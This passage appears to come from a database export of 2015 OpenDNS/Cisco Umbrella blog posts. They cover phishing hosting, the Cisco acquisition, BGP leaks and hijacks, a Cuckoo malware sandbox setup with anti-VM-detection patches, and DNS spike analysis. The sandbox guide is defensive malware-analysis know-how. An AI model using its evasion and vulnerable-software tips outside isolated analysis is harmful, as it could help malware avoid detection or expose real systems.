DNS traffic, potentially indicating other campaigns or testing prior to this specific phishing campaign.\n\nThis is another domain that was automatically blocked at OpenDNS using NLPRank.\nCompromised Hosting\nBankruptcylawyershawaii[.]net\nbankruptcylawyershawaii[.]net appears to be a legitimate website, but was compromised at some point and used in an attempt to harvest credentials with the following phishing page:\nLooking at the html source of this page, we can see that clicking the ‘Verify’ button will send credentials to the file: weba-akp.php, which is stored locally on the website. This is the standard behavior in most commodity phishing attacks in which the phish utilizes a compromised site. Often, credentials are sent to an email that’s configured statically in the php or other file with code designed to be run on the server.\n\nThe domain was registered on March 21, 2014 at godaddy[.]com. The whois data is not hidden as it was with the more targeted serviceyourpaypal[.]com.\nThe domain is using private nameservers provided by Hostgator. These name servers are used by customers of Hostgators reseller, dedicated and VPS hosting plans. The IP address this domain uses as its A record is hosting a total of 11 domains.\nWhen viewing DNS requests, it’s impossible to miss the suspicious spike in traffic around April 18. That is most likely when this phishing campaign was active.\n\nFree Hosting\nupgrade2015a.wix[.]com\nThe next phish was located at the free hosting provider, wix[.]com. Anyone can use wix[.]com to host a free website. As of June 29, 2015, the following phishing page was online at upgrade2015a.wix[.]com:\n\nWix[.]com is hosted at GoDaddy and owned/administered by Incapsula. Incapsula only had 17 domains seen used in phishing from this data set and wasn’t actually part of the top 10 worst ASN’s, but it’s a good example of free hosting being used in phishing.\nLooking at the DNS requests for this subdomain, there is an obvious change in the requests which suggests this campaign started on June 26, 2015. There may have been some testing on June 23, when we see only a few requests.\n\nConclusion\nUsing just a small sample of reported phishing content, we can capture a fairly good picture of which hosting providers may be more vulnerable to compromise or more forgiving of malicious behavior. This information can be useful when considering where to host your website or online service. Additionally, just a quick analysis of data from Phishtank can be used to build a training set of indicators to look for when working to protect users across a network.', 'Big Data;Malware;Security Research', 'https://umbrella.cisco.com/blog/2015/07/01/which-providers-have-the-most-phishing-content/');

Your feedback and support helps us build world-class security services, and frankly, it’s what motivates us each and every day to deliver security solutions to keep you and your company secure. Today we protect 65 million Internet users spread across more than 150 countries. That number includes the employees of more than 10,000 organizations, from small businesses to global deployments with Fortune 500 enterprises. Believe me – That’s a lot of motivation!\nWe will carry this passion with us as we transition to become a part of Cisco. We take our commitment to you and your trust in us with the utmost seriousness. It’s an honor to serve you.\nCisco recognized this passion and was drawn to OpenDNS because of it. Cisco’s commitment back to you is to maintain OpenDNS as it is today. We’re not going anywhere and OpenDNS as you know it will continue to work as it does today. In Cisco’s words: “This level of service for all users is a priority.”\nWe’re very excited for what the future holds, and we’ll share more about that in the coming months. In the meantime, I’d like to point you to a blog post from Cisco Chief Technology and Strategy Officer Hilton Romanski which you can find here, along with a site we created to discuss this announcement. Below, I have included an email I sent earlier this morning to the incredible team we have here at OpenDNS that provides more details on this partnership with Cisco.\nLetter to Employees\nTeam –\nYou’re going to read in the news this morning (or afternoon for the London team) that we’ve entered into an agreement to be acquired by Cisco. Because this is a really big deal and Cisco is a public company, I unfortunately wasn’t able to talk about it with all of you before the news hit the wires. If you haven’t read the announcement yet, you should take a moment to read the press release first.\nI have a lot to say, but I’ll try to keep it short since I know you all have a lot of questions. We will answer them starting with this email and continue at a Townhall meeting at 10am Pacific. And for those interested, I have added some expanded thoughts at the bottom of this email.\nFirst: This is an incredible milestone for our business – a milestone very few other companies ever reach. This is a testament to the outstanding team we have assembled, the rapidly scaling business we have created, and the advanced security solutions we have developed. You should be exceptionally proud.\nSecond: I’m incredibly excited about the potential this unlocks for us in the years to come. Other companies have approached us in the past, and when Cisco initially presented us with an offer, while flattered, we didn’t think it would progress further than previous similar discussions. However, over the course of our conversations, we got to know Cisco better as a company and as individuals. And every interaction has reinforced that we share a common vision and worldview.  It became clear that they were the right partner and that now was the right time. We didn’t decide to sell OpenDNS. We decided to sell OpenDNS to Cisco. That’s an important distinction.\nWhen Cisco made a compelling case that we would be stronger together, we agreed. We’re confident about this next move for us. Cisco has great respect for the technology we’ve built and taken to market, for our incredible team, and for our culture. Cisco is not buying OpenDNS for our individual components, but for the whole. I will speak more about this today and over the coming weeks.\nThird: We believe we can move faster and with more impact by leveraging Cisco’s scale and resources in a way that we would be unable to do on our own or with any other partner. Just look up how many of their endpoint clients are installed (over 100 million!) or routers and firewalls deployed!\nSo what happens next? Our jobs will be the same as they were yesterday. In fact, because this is such a big deal, we need to go through some anti-trust clearance and other closing conditions before we finalize the transaction. That will take anywhere between six and eight weeks, maybe less. Going forward our goals and vision remain unchanged. Help the world connect with confidence on any device, anywhere, anytime by designing, developing and building world-class security services for the customers who rely on us.\nRight now you should pause for a moment and be proud. Whether you have been here for five years or five weeks or five days, the company that you joined was the right one, and will continue to be the right one. We have developed pioneering security services, delivered them to market, and had great fun while doing it. All of this is an amazing accomplishment. I am confident that we have many more accomplishments to celebrate ahead of us.\nOn a personal note, I love working with all of you. I am so proud of the company we have built together. As I’ve said in meetings before, this kind of thing doesn’t just happen. It takes hard work and really is something special. Very few companies ever achieve a level of success like we have. In case any of you are wondering, I’m not going anywhere. I love what I do, working with all of you, shipping incredible security products, and I’m excited to keep doing that at Cisco. Over the coming months we will be working with each of you on becoming Cisco employees. This will be a collaborative process, just as most things are here.\nFor some logistics… You’ll get more details later today and we will all gather at 10am for a Townhall. If you are remote, you can connect to a WebEx that will be sent out in an invite. It’s also the end of the quarter, and in the midst of all this news, we need to continue to exceed our Q2 Goals.

Read part one here.\nThe last half-decade has witnessed a number of events that perfectly exemplify what happens when BGP goes wrong. Whether caused purposely by malicious attackers or by accident from routing leaks, the effect is essentially the same: everyone has a bad time. In these cases, many companies and content providers end up becoming collateral damage even if they aren’t directly involved. BGP includes a concerning element in its ability to affect nearly every major Internet service within a short time frame. But what’s most surprising about the protocol, which is in charge of routing nearly all the Internet’s traffic, is that it runs on a system of trust between providers.\nThe Internet’s Telephone Game\nBGP can get complicated, being at the core of what can go wrong with Internet routing. It starts with what are known as Autonomous systems (AS).\nAn autonomous system is a collection of IP networks managed autonomously–hence the name–under one routing policy.\nImage from Shutterstock\nEach AS gets a unique number (ASN) to identify itself from the regional Internet registry. Each AS is connected to at least one other AS, which will connect it to the rest of the Internet.\nA single AS can be connected to dozens or even hundreds of other ASNs, through what is called peering (see part one). It’s easy to picture the entire Internet as a graph, with each node on the graph representing an AS.\nEach AS in the graph tells the rest of the Internet via its neighbors for which IP networks (often called prefixes) it is willing to receive traffic. This process is often referred to as “announcing.”\nAndree Toonk, founder of BGPmon and manager of network engineering at OpenDNS, says that announcing is the way for a company to establish which prefixes it would like the world to know. Essentially it’s a way of posting a billboard on the Internet superhighway to say, “Hey, I’m GoodShoes, Inc.! And I’m over here!” Routers then use that information to find the best route to that company.\nThis process is important because there are announcements that are only supposed to stay between two ASNs, not intended for further external use. When one of those ASNs propagates the announcement for the prefixes to the world incorrectly, it is called a “leak.” Leaks happen fairly regularly, and are typically due to configuration a mistake. As a result, traffic is redirected through a different network, which can cause issues like performance problems and security related concerns.\nBGP hijacks are a similar problem. With a BGP leak, an AS inserts itself in the middle of a path, but in a hijack an AS simply claims it owns the prefixes and should receive all traffic for it.\nBGP Leaks: Simple, Yet Costly\nTier 1 provider Level3 recently became an unfortunate case study on the drastic effects of a mistaken BGP leak.\nIt started when a Malaysian ISP incorrectly announced a large amount of routes–BGPmon estimates about 179,000 of them.\nImage: BGPMon.net\nLevel3 then incorrectly accepted those routes as good, and re-routed  a massive flood of traffic to the ISP in Malaysia, by propagating the new routes to all its customers. It was a flood Telekom Malaysia did not intend, and was not equipped to handle, which then began dropping packets on a large scale. This event is essentially a mistaken “man-in-the-middle.” As a result, a number of major Internet services like Snapchat, Skype, and Google ended up having services degraded for about three hours.\nThree hours might not seem like much time, but in Internet time where millions of transactions take place every second, it can be extremely costly. And, according to Toonk, there’s a number of different ways these can occur and aside from some basic filtering, there’s not much to prevent them from happening.\n“There’s a whole philosophical debate as to who owns more responsibility in incidents like these,” he said. “Given how large Level3 is, and its pivotal role on the Internet, it has the greater responsibility in fixing issues like this because it’s what the company does. But obviously if the Malaysian telecom [company] had not made the error in the first place, it never would have happened.”\nBGP Hijacks: Simple, Yet Profitable\nOne famous example of an entity conducting a BGP hijack on purpose was the Turkish hijack of Google DNS, OpenDNS, and Level3 in the spring of 2014. At the time, a corruption scandal was brewing, and to circumvent blocks placed on Twitter and YouTube by large ISPs in Turkey, civilians began using free DNS services. In a ploy to stop the dissenters from spreading their message, Turk Telekom began hijacking DNS traffic using BGP announcements.\nMalicious hijacking can cause some damaging results. Toonk commented that if a hijack is successful, “the rate of impact can be severe.”\nBut not all are politically motivated. Some are monetarily motivated, like the case of a large-scale hijack affecting at least 19 ISPs conducted by an attacker looking to steal Bitcoins. Going back to the concept of time during these sorts of attacks–or even in mistaken leaks like the one involving Malaysia Telekom–every second is damaging. The hacker who perpetrated the Bitcoin theft averaged around 30 seconds during each traffic hijack. Even so, after at least 22 attacks, it was enough time for him to steal around $9,000 a day, and an estimated $83,000 total.\nRouting Better: Time for a BGP Change\nHijacks and leaks occur because the BGP framework–the system that runs the entire Internet–currently operates on a system of trust, and wasn’t designed with security built into it. There is currently no easy way to verify information from a provider.\n“In BGP I just have to trust whatever other providers are telling me, is true,” Toonk said. “But there’s no way to verify for sure. On the web, for instance, we have HTTPs. With a certain degree of trust, you can tell if the site you’re on is legitimate. With BGP, if you say you can reach Google, I just have to trust that is true.”\nAnd currently, Toonk said, there’s no easy way for the owner of an IP network to even prevent leaks and hijacks from occurring. ISPs and users of BGP can only monitor for incorrect routing events. This reality was confirmed by Job Snijders, an IP developer for NTT America, a major Tier 1  ISP.\nAccording to Snijders, there were a number of measures Level3 could have taken before and following the major route leak on June 12. He referenced an open letter to Level3 that suggested a number of measures the provider could have taken to prevent the leak from happening in the first place. One was maximum prefix limits–a way of setting a maximum number of new prefixes a peer can announce. Snijders said it’s up to providers and routers to change their behavior to prevent new announcements and routing changes from being accepted in bulk automatically.\nSome of the responsibility to prevent leaks also falls on manufacturers. Routers are by default often set to advertise every route they can possibly reach. “It would be a great win if manufacturers would provide network operators with a configuration knob that changes this default behavior ,” he said. “Leaks occur when filters don’t properly prevent this from happening.”\nA public key infrastructure called RPKI (resource public key infrastructure) could also help validate ASNs and IPs, but similar to DNSSEC, it’s running into difficulties with adoption, as not everyone in the industry is convinced it is the best fix.\nHowever, not all preventative measures need to be highly technical. Toonk says monitoring like the type that BGPMon provides can be a huge help in limiting attack or leak time and troubleshooting efforts. Proper filtering on the ISP side can also prevent a lot of issues.\nOr, as Snijders added, sometimes it might be as simple as picking up the phone. “When you see a route leak incident happen, get on the phone,” he said. “It doesn’t matter whether you are a customer, supplier, or just a bystander. Literally keep calling until you get through to someone who can fix the issue.”\nIn the end, the system of trust that is holding up the Internet can also be used for good. “Perseverance always wins,” Snijders said. “We’re in this together. We need to help each other.”', 'BGP;Blog;News;Security 101', 'https://umbrella.cisco.com/blog/2015/06/25/bgp-and-the-system-of-trust-that-runs-the-internet-pt-2/');

It was a good thing the event moved from the Earls Court Exhibition Centre as I’m not sure the old venue could have held the number of vendors or attendees. It was packed.\nOpenDNS had a booth on the show floor in one of the most trafficked thoroughfares in the building. Whenever we walked by the booth, it was bustling with activity.

Estimates are predicting as many as 75 billion devices will come online by 2020, which means Internet traffic routing is going to get a lot more complex.\nWhat most Internet users don’t know, but many are beginning to discover, is the entire framework that holds the Internet together can be quite fragile. In fact the system in charge of correctly routing Internet traffic is largely built on a collective trust, or as The Washington Post recently described it, an ‘honor code’ of the Internet.\nThe fact is we all rely on core protocols of the Internet like BGP (border gateway protocol) and DNS (domain name services) every day. They are a foundation of the Internet. Even companies that provide content on the Internet but don’t need BGP services directly, still rely on the service to get that content to their customers.\nThis two-part series will cover BGP, what it is, how it works, and what global moving parts are involved. Part two of this series, publishing next week, will cover the technical and security issues surrounding BGP, and why they often have a drastic effect on a global scale.\nThe Buried Superhighway\nThere is good reason behind portraying the Internet as a superhighway. Internet requests have a starting point (usually a device or computer) and a destination (like a website or app service). But the superhighway analogy is also apt because the Internet–despite its illusionary feeling of magic behind a box–is largely a physical thing, consisting of cables that run for hundreds of thousands of miles, many of them underground.\nAn interactive map of the submarine cable routes, from submarinecablemap.com\nPictured is a map of the submarine routes Internet cables take around the globe. They are literally physical cables that surface out of the ocean to connect all the countries of the world to one another. The other half of what makes the magic of the Internet work, are the various standards and protocols involved–the documented, collective agreement on how the Internet and its protocols should function, and the provider companies who pledge to make them work the way they should. The resulting covenants between Internet providers, are what keep the entire wheel of the Internet churning. And BGP plays a major role.\nA common description of DNS (domain name services) is “the address book” of the internet. DNS looks up and resolves domains, like google.com, to their correct IP addresses, which are the real destination. If DNS is the address book that finds the destination, BGP is the system of freeway signs that show which routes can get there.\nJust like roads and freeways, some routes are quick and direct, and some routes send traffic on misdirected tangents. BGP is the complex, interweaving system that gets Internet traffic where it needs to go, hopefully as efficiently as possible.\nPeering: Good Neighbors Make Faster Internet\nAndree Toonk, founder of BGPMon and manager of network engineering at OpenDNS, explained in an interview that the problems and outages the world has seen recently that involved BGP start with how the networking relationships between providers and businesses work.\nThe Internet as it is today consists largely of two types of relationships between businesses and ISPs, Toonk said. The first and more straightforward type of relationship is between providers and customers. In this scenario, customers–smaller regional ISPs and businesses like DropBox and OpenDNS–pay large providers–like AT&T and Level 3–to provide connectivity service for their users and customers. This type of relationship is formal, and can be costly depending on the providers and the details involved.\nPeering is the second type of relationship, Toonk says, and it brings a few unique benefits. If a small local ISP wants to connect its customers to Facebook, for example, and doesn’t want to pay the large ISP acting as the middleman, the smaller ISP can connect using a peering relationship. Getting to Facebook is much easier done when there is a direct connection, and it will usually have less latency. And, Toonk says, one of the great benefits in a peering relationship is they are usually much more cost effective.\nA map of Internet exchange locations from datacentermap.com\nThese peering relationships are typically established at an Internet exchange (IX). They are pretty much exactly what they sound like, a central location where a large number of ISPs, businesses, and content providers connect to one another physically. Exchanges exist all over the globe, and they allow a more direct way of connecting end users to the Internet and its bounty of sites and services.\nThese relationships are at the core of how companies and Internet providers connect to one another globally. But, as Toonk explained, they can also be the source for huge routing and security issues. That is because the relationships keeping the Internet functioning, especially peering relationships, are where the “honor code” mentioned earlier comes into play.\nStay tuned for part two, which will explain how the honor code works, how BGP is becoming a new target for hackers, its involvement in some of the largest Internet outages ever seen, and the steps the industry is taking to correct the issues.', 'BGP;Blog;News;Security 101', 'https://umbrella.cisco.com/blog/2015/06/18/bgp-and-the-system-of-trust-that-runs-the-internet-pt-1/');

But despite the fact that the company is a newcomer to the United Kingdom, new EMEA VP Andre Stewart says he has good reason to believe that OpenDNS will be right at home in the heart of London.\nAlthough the connection may not be immediately obvious, Stewart says that The City and the cloud-delivered security company have both been defined by a love of innovation and comfort with fast-paced growth in recent years. He believes that these qualities make OpenDNS a good fit for not only London, but the rest of EMEA, as well.\nJourney to OpenDNS\nStewart has had a long and successful career with some of the world’s leading enterprise security and networking vendors. But his path to that early success was both unconventional and illuminating for someone who would later oversee hundreds of millions of dollars in sales across Europe.\n“After the dotcom bust, I was part of a cross-border channel M&A business,” said Stewart. “It was mostly resellers and distributors working in the communications sector. The companies I was working with ended up becoming [major channel companies] Telindus, Dimension Data, Westcon, Logicalis and Articon Integralis [now NTT Com Security].”\nStewart explains that many European customers have very strong relationships with their partners, making these channel players a key target demographic for technology vendors looking to break into Europe. With his expertise, opportunity quickly came knocking in the form of NetScreen, one of the world’s first hardware network security companies.\n“NetScreen was the first company to put software into hardware and create network security appliances,” said Stewart. Early employees of NetScreen and OneSecure (a company acquired by NetScreen in 2002) went on to found Palo Alto Networks and Fortinet, companies which continue to dominate in the next-generation firewall and unified threat management space today.\nWhile helping NetScreen navigate the market opportunity in Europe, Stewart saw firsthand the opportunity — and challenges — of the network security market.\n“That was the beginning of network security,” he said. “Before that, there were only really antivirus and content filtering solutions. In the mid 2000s is when I think we first started talking about cybercriminals, and what they were doing. The industry had to educate people on just how big the opportunity was, what the market potential was and what problems we were addressing.”\n“Even though there were early breaches, there were actually very few people at the time paying attention to new developments in security. It’s only been recently, in the last 24 months or so, that we have seen people outside of the industry talking about cybercrime and cyberterrorism. It’s only very recently that most people understand that they have been affected,” he said.\nLater, Stewart moved on to senior leadership positions at Corero, Fortinet, and finally A10 Networks.\n“When I was at Fortinet in France, sales grew from nothing to over $100 million over six years… and that offering wasn’t as exciting as OpenDNS,” he said.\nKindred Spirits Between OpenDNS, Londoners\nBut what makes OpenDNS exciting? Why did he choose to join the company? Stewart says that it’s a combination of the company’s business model, past history and future promise that hold up well when compared with the forces that are shaping today’s security needs in the enterprise.\n“The way that the world is going, there are three high growth areas that are really interesting: preventing cybercrime, Big Data/analytics and cloud-provided services,” he said. “The thing is, OpenDNS is one of the few companies that can credibly say it does all three of those, and that’s very interesting.”\n“We also have an infrastructure that’s for real. It’s extremely robust and has been working since 2007,” said Stewart. “That’s incredible. Infrastructure is a major barrier to entry for other companies. If you look around and you see some of these startups from Silicon Valley and elsewhere, they may be very well-funded, but few of them are approaching OpenDNS’s kind of performance. OpenDNS has a massive amount of data that we’re ingesting every second and from that we have the infrastructure to produce intelligence on what’s good and what’s bad on the fly.”\n“Finally, dealing with so much data per second and then coming out with intelligence on the back of it is quite unique in the market,” he said. “With these capabilities and proprietary data, you can interest high-end customers in any vertical as well as providing the same quality service to SMEs.”\nStewart also sees the company’s growth potential as a boon for customers. “It almost reminds me of the early days of Yahoo! and Google; the more people that used their services, the more accurate their searches became.” He added that OpenDNS’s threat intelligence collection methods are not intrusive, unlike companies that target end users for advertising.\n“With OpenDNS, the more companies that deploy it, the better the intelligence is. It’s a virtuous cycle,” he said.\nStewart sees a similar cycle powering the booming economy that has defined London’s character in recent years.\n“Why did we choose London? It’s really based on the fact that London is an extremely dynamic, growth environment,” he said. “More and more entrepreneurs are coming to London and starting their businesses here than other European countries. A lot of the young talent, and even the older talent, are coming to London because there is employment and investment here. People in Spain, France, Italy, Greece–the people who are leaving university in these countries, instead of staying in a local capital are coming to London. All of that means more people in London. More buzz, more restaurants, more buildings, more work and a bigger economy. It’s an upwards cycle.”\nSecurity, and Solutions, without Borders\nDespite these similarities, Stewart says that OpenDNS’s solution is uniquely broad, and that it can bring value to the specific security challenges facing companies throughout Europe and the rest of the region.\n“We’re starting from London, but the whole European market can benefit from OpenDNS,” he said. “Whether it’s countries like Italy that have lots of very small companies, to countries like Germany that have lots of middle sized companies or France with a lot of big companies — it doesn’t matter. Everybody can benefit from our solution.”\nStewart says that the company initially plans to establish itself in London, and then expand to other countries in EMEA. Stewart believes that OpenDNS’s services are differentiated and show value to customers in any country around the world.\n“It’s about taking the unique intelligence and the data and really bringing it to the forefront to provide security,” he said. “There are few companies that actually do that, and OpenDNS can consider itself as one of those few.”\n“These qualities stand for the world. There are no barriers for cybercrime, so there should be no barriers for cybersolutions.”', 'Announcements;Blog', 'https://umbrella.cisco.com/blog/2015/06/17/opendns-emea-launch/');

Running samples on your main system is just, in general, a bad idea all around. I won’t attempt to cover all of possible items out there, as the list is long. I will, however, go over a simple setup involving Cuckoo Sanbox that will allow you to get some good insight into malware behavior.\nSo you wanna play with some malware huh?\nA popular tool among security professionals is the open-source Cuckoo Sandbox. Cuckoo Sandbox will allow you to submit files and URLs, analyze the data, and return the results in nicely laid out format. There are a few different forks out there, but in this case, we’re going to stick with the original, which can be cloned from here. One might ask: “But aren’t there already publicly facing versions out there that will do this for me?”, and the answer to that is: yes. The people over at Malwr have kindly deployed one of these said instances, and it works amazing. However, there are a couple downsides to using cloud based analysis tools.\nThe first and foremost issue is that when you upload samples to places such as Malwr and VirusTotal, malware authors, who can also use these same services, may see that their work has been captured, and make changes to the code, thus, giving them an edge to alter detection methods. The second downside is that the 3rd Party tool you are using might itself be down for any one of various reasons. Or number three, perhaps you are like me, and like to keep all your samples and data close by. At this point, we’re going to go with item three, and deploy our own sandbox to play in.\nCuckoo has great detailed documentation about how to install it, and works quite well out of the box. Along with the documentation, there is also a wealth of articles out there you can read. Yet, one thing I noticed is that a lot these articles are a bit old (in Internet years that is). While building up my sandbox, I spent a number of hours that lead into days scouring the Internet for various ways of deploying and hardening the system. I’ll save you all of the time and instead give you what I learned during my trial and error period.\nYou could go through all the docs from the aforementioned link, and install all of the needed library’s, modules, and databases individually, and that is fine. However, while doing my research, I discovered that David Reguera (@fr33project) was already nice enough to take the majority of this work and put it all into a nice, tidy, bash script. The script will install, clone, and setup all of the basic necessities to get up and running. It will also make a new user named ‘cuckoo’ for you to run the sandbox under. A couple points of note: 1) on line 41 of the script, you will want to change ‘debian\'(if you are not using Debian that is) to whichever distro of choice you are using, i.e. if you decided to use Ubuntu as your host machine, you should change that line to reflect said distro, and 2) if you decided to change the new user name to your existing user, the permissions in the script will bork you out of your admin access if you have not already added yourself to the visudo file, and you will spend the next several minutes having to hack around your box to regain your admin privileges, so be forewarned.\nUpon completion of the script you will also have VirtualBox installed (if it’s not already), which you will use to house your guest (read: target) virtual machine(s). You can also use VMWare, but the default configuration files for Cuckoo are already setup for VirtualBox. Your guest Operating System(s) can be whatever you choose. I recommend using as many different ones as possible, and have, at the very least, a nice, highly vulnerable Windows XP going. If you have the space on your hard drive, it’s recommend the size of the Guest OS be greater than 60GB. For Cuckoo to work, the guest OS requires a script called ‘agent.py’, which you can find in the /path/to/cuckoo/agent directory. Now would be a good time to install the VirtualBox Guest Additions to make importing this script a bit easier. By putting the agent.py script in your guest OS system under the users Startup folder and renaming it to ‘agent.pyw’, it will start up automatically every time(the ‘w’ makes it so the script starts up hidden). For this to work, you will also have to install Python, and it is also recommended to install the Python Imaging Library.\nAt this point, it’s a good idea to take a snapshot of the system and restart the guest OS and run task manager to make sure the agent script is running the way it should be. If all that looks good, it’s time to move on and add some vulnerable applications for your samples to try and exploit. Heading over to oldapps.com, you can find a plethora of software to choose from. Here the choice is yours on what to install, but you should stick with old versions of Internet Explorer, Flash, Silverlight, and Reader at the bare minimum. Take a new snapshot at this point so Cuckoo will use everything you have just installed. So far, the following should have been done:\n1) Run script to install and setup cuckoo\n2) Installed Guest OS into VirtualBox\n3) Installed agent.py script into Guest OS\n4) Installed some old, vulnerable applications\n5) Take a snapshot\nOnce all of the above steps are completed, you should now change the network settings of the Guest OS. The first step is to change the IP of the Guest from DHCP to something static, with 192.168.56.101 being the default in the /path/to/cuckoo/conf/virtualbox.conf file, so I recommend to just go with that. Next change the network settings of VirtualBox from NAT to Host-Only, and change, at the least, the first six bits of the MAC address to anything other than 080027, as some malware will check this, and determine it’s running in a VirtualBox environment.\nHarden your sandbox against VM detecting malware\nThe next stop in the process is to harden up your Guest OS from vm-aware malware. Yes, this is a real thing. Some malware will actually detect it’s running in a sandbox, and perform differently, if at all. You can see for yourself by running this executable written by Alberto Ortega (@a0rtega). You’ll be able to see, most likely, a bunch of red ‘traced!’ items in the command window that appears on the Guest OS after uploading the sample. This is bad, and means that real malware will also detect you are trying to analyze it. No fun.\nFear not though, for there is a .dll for that! With the Cuckoo community being what it is, and the open-source awesomeness that also comes along with it, there are all kinds of ways to expand your Cuckoo installation. Mark Doe(@mark_ed_doe) created this cuckoomon.dll patch to make the VM less detectable. For this, I copied the original cuckoomon.dll found in /path/to/cuckoo/analyzer/windows/dll/cuckoomon.dll to: original_cuckoomon.dll and then copied the new .dll into the same directory. Make sure you:\n$ chmod -x cuckoomon.dll\nIf you are all done with the VirtualBox Guest Additions, you should now uninstall it from the Guest OS to help mitigate any residual VirtualBox giveaways. Snapshot time again! Let’s run the pafish.exe again. This time, you should see a lot less red, and a lot more green. This is where we want to be, as you’ve now made your sandbox less detectable. One part I haven’t been able to figure out yet is the mouse integration detection, but I think if you turn off mouse integration this might do the trick. Unfortunately it’s kind of a pain to scroll back up in the command window while running the pafish.exe with the integration turned off to see if this does indeed help against that detection.\nYou can deploy more than one VM, but you will have to use a different database than the default setup, as well as a couple other modifications that you can read about in the docs(you should read the docs anyway, as they are way more verbose about the integrals of how Cuckoo works).\nYou are now ready to start running samples through your sandbox, if you don’t have any yet, or want to expand, there are a couple of places you can go and retrieve some. A couple of good places to start are the sites malware-traffic-analysis.net and kernelmode.info.\nSources:\nhttp://www.cuckoosandbox.org/\nhttp://www.wired.com/2014/09/how-hackers-use-virustotal/\nhttps://github.com/buguroo/cuckooautoinstall/blob/master/cuckooautoinstall.sh\nhttps://github.com/a0rtega/pafish/blob/master/pafish.exe\nhttps://github.com/markedoe/cuckoo-sandbox/blob/master/cuckoomon.dll\nhttp://www.oldapps.com/', 'Incident Response;Malware;Security Research', 'https://umbrella.cisco.com/blog/2015/06/16/deploy-your-own-cuckoo-sandbox/');

Primarily affected was Level3 (AS3549 – formerly known as Global Crossing) and their customers. Below are some of the details as we know them now.\nStarting at 08:43 UTC today June 12th,  AS4788 Telekom Malaysia started to announce about 179,000 of prefixes to Level3 (AS3549, the Global crossing AS), whom in turn accepted these and propagated them to their peers and customers. Since Telekom Malaysia had inserted itself between these thousands of prefixes and Level3 it was now responsible for delivering these packets to the intended destinations.\nThis event resulted in significant packet loss and Internet slow down in all parts of the world. The Level3 network in particular suffered from severe service degradation between the Asia pacific region and the rest of their network. The graph below for example shows the packet loss as measured by OpenDNS between London over Level3 and Hong Kong. The same loss patterns were visible from other Level3 locations globally to for example Singapore, Hong Kong and Sydney.\n\nAt the same time the round trip time between these destination went up significantly as can be seen in the graph below.\n\nTime line\nBy just looking at the number of BGP messages that BGPmon processed over time as can been seen in the graph below, there’s a clear start where all of a sudden the number of BGP updates increased. When we look closer at the data it becomes clear that this increase in BGP messages starts at 08:43 UTC and aligns exactly with the start of the leak and the start of the packet loss issues.  At around 10:40 we slowly observed improvements and at around 11:15 UTC things started to clear up.\n\nLet’s look at an example.\nAn example affected prefix is 31.13.67.0/24 which is one of the Facebook prefixes. The AS path looked like this\n1103 286 3549 4788 32934\nIf we look at this path we see that AS32934, Facebook, is the originator of the prefix. Facebook peers with 4788 and announced it to its peer Telekom Malaysia (AS4788) which in turn announced it to  Level3 (AS3549) which announced it to all of its peers and customers, essentially giving it transit and causing a major routing leak.\nBecause Telekom Malaysia did this for about 176,000 prefixes they essentially signalled to the world that they could provide connectivity for all these prefixes and as a result attracted significantly more traffic than normally. All this traffic had to be squeezed through their interconnects with Level3. As a result all this traffic was now being routed via Level3 and Telekom Malaysia was likely to hit capacity issues, which then resulted in the severe packet loss issues as users reported on Twitter and as we’ve shown with the data above.\nThe 176,000 leaked prefixes are likely all Telekom Malaysia’s customer prefixes combined with routes they learned from peers.  This would explain another curious increase in the number of routes Level3 announced during the leak time frame.\nThe graph below shows the number of prefixes announced by Level3 to its customers.  Normally level3 announces ~534,000 prefixes on a full BGP feed. These are essentially all the IP networks on the Internet today.  Interestingly during the leak an additional 10,000 prefixes were now being observed. One explanation for this could be that these are more specific prefixes announced by peers of Telekom Malaysia to Telekom Malaysia and are normally supposed to stay regional and not visible via transit.\nNumber of prefixes on Level3 full IPv4 BGP table\nSince Level3 was now announcing many more prefixes than normally, it would have hit Max prefix limits on BGP session with its peers.  These peering sessions with other large tier1 networks carry a significant portion of the worlds Internet and the shutdown of these session would cause traffic to shift around even more and exacerbate the performance problems as well as causing even more BGP churn.\nSo in conclusion, what we saw this morning was a major BGP leak of 176,000 prefixes by Telekom Malaysia to Level3. Level3 erroneously accepted these prefixes and announced these to their peers and customers.  Starting at 8:39 and lasting for about 2 hours traffic was being redirected toward Telekom Malaysia, which in many cases would have been a longer route and also caused Telekom Malaysia to be overwhelmed with traffic.  As a result significant portions of traffic were dropped, latency increased and users world wide experienced a slower Internet service.', 'BGPmon;Security Research', 'https://umbrella.cisco.com/blog/2015/06/12/massive-router-leak-causes-internet-slowdown/');

However, relying solely on spiking traffic is often not enough. Many benign websites have spikes in traffic that are not related to malware activity but instead a popular blog post or a referral from a big traffic website (reddit, NYTimes, etc). This blog post will be examining the different types of spikes we see across OpenDNS’s worldwide resolvers.\nOne simple method to filter out benign domains that have a spike in DNS queries over an hour is to look at the historical trend of DNS queries to that domain. This filter looks at the average traffic received by a domain over the course of a specified time window and discards domain which have an average traffic over a certain threshold. This crude filter works well in removing domains who historically have had near constant traffic with few deviations. The class of domains removed by this filter are rarely malicious.\nSimple filters can help bubble up websites that are potentially malicious such as\n\n\n*[.]escortlarankaratr[.]net – a compromised domain hosting the nuclear exploit kit. However, challenges still lie. The following domain is a good example of a false positive that can occur.\nLets examine the following query pattern for the domain umuthuzmeleri[.]files[.]wordpress[.]com:\n\n\nHere is an example of a domain experiencing a sharp spike in traffic. However, a manual investigation of the site reveals that it is not hosting any malicious material (at the time of the spike). Ideally, we would like to see if looking at query data we can find some information that would allow us to identify this spike as benign. Once again looking at the historical query history of the domain provides some valuable information. Let us zoom into the data for a week snapshot before the spike:\n\n\nHistorically this domain received low traffic but in a consistent pattern that was repeated over a week. This type of traffic pattern is most likely associated with a normal website. Our first filter was a basic filter which removed domains that had an average hourly DNS request count over some threshold. Our second filter will capture the periodic behavior of request traffic and filter out domains that exhibit periodic behavior for some specified time window. We create a composite signal which represents the average behavior of periodic DNS queries to websites with low traffic. A cutoff filter is created which filters out domains which have periodic signals which deviate by small error constant from the original composite signal. A more sophisticated filter could be created but the goal is to create a quick filter which will allow us to rapidly prototype and test out ideas. This filter serves as an easy and quick way to filter out a large class of false positives. Development and analysis of the more complicated filters used will be subject of another blog post.\nThere is another piece of information that we can use to help augment our decision making. Let us see if any of the clients requesting the domain during the large spike are on any known spam blacklist. Interestingly, the majority of clients participating in the spike were seen on blacklists created by Project HoneyPot. The spike could be a possible attempt by an attacker to perform a mail inject or brute force a password. As a result, we do not classify this domain as malicious but instead monitor for suspicious redirects coming from the website. This could be a sign that the spammers who created the spike were suspicious in compromising the website. Relying on traffic patterns and well established blacklist we can help identify and label different types of spikes that we see.\nFuture work involves designing a method to cluster the different types of spikes. Clustering provides an analyst an easy way to visualize 